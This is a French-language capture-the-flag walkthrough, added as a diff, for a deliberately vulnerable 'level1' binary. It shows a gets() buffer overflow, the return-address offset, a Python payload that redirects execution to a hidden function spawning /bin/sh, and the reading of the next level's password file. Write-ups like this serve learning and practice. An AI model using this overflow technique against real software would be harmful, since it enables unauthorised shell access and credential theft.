@@ -1,0 +1,95 @@
+# Walkthrough - level1
+
+## 🧩 Objectif
+
+Obtenir un shell en tant que `level2` en exploitant une vulnérabilité dans le binaire `level1`.
+
+---
+
+## 🔍 Analyse du binaire
+
+### Étape 1 : Observation du comportement
+
+En exécutant simplement le programme :
+
+```bash
+$ ./level1
+test
+```
+
+→ Le programme attend une saisie utilisateur, puis quitte.
+
+---
+
+### Étape 2 : Analyse statique dans Ghidra
+
+J’ai ouvert le binaire dans Ghidra et observé la fonction `main` suivante :
+
+```c
+void main(void) {
+    char local_50[76];
+    gets(local_50);
+    return;
+}
+```
+
+🔸 La fonction `gets()` lit dans un buffer de 76 octets sans aucune protection → **buffer overflow possible**.
+
+---
+
+### Étape 3 : Rechercher une fonction cachée
+
+En parcourant la liste des fonctions, j’ai trouvé une fonction nommée `run`, non appelée dans `main`, contenant :
+
+```c
+void run(void) {
+    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
+    system("/bin/sh");
+}
+```
+
+🔸 Cette fonction appelle `system("/bin/sh")`, ce qui permet d’ouvrir un shell si elle est appelée.
+
+Son adresse (trouvée dans Ghidra) est :  
+```
+0x08048444
+```
+
+---
+
+## 🧪 Exploitation
+
+### Étape 4 : Calcul de l’offset
+
+Le buffer dans `main` fait 76 octets → EIP est écrasé au **77e octet**.
+
+Il faut donc envoyer :
+- 76 octets pour remplir le buffer
+- puis l’adresse de la fonction `run()` en little endian (`\x44\x84\x04\x08`)
+
+---
+
+### Étape 5 : Construction du payload
+
+```bash
+$ python3 -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/payload
+```
+
+---
+
+### Étape 6 : Exécution de l’exploit
+
+```bash
+$ cat /tmp/payload - | ./level1
+Good... Wait what?
+$ whoami
+level2
+$ cat /home/user/level2/.pass
+<mot de passe affiché ici>
+```
+
+---
+
+## ✅ Résultat
+
+L’exécution du binaire avec le bon payload m’a permis d’exécuter la fonction `run()` et d’obtenir un shell sous `level2`. J’ai ensuite pu lire le mot de passe du niveau suivant.
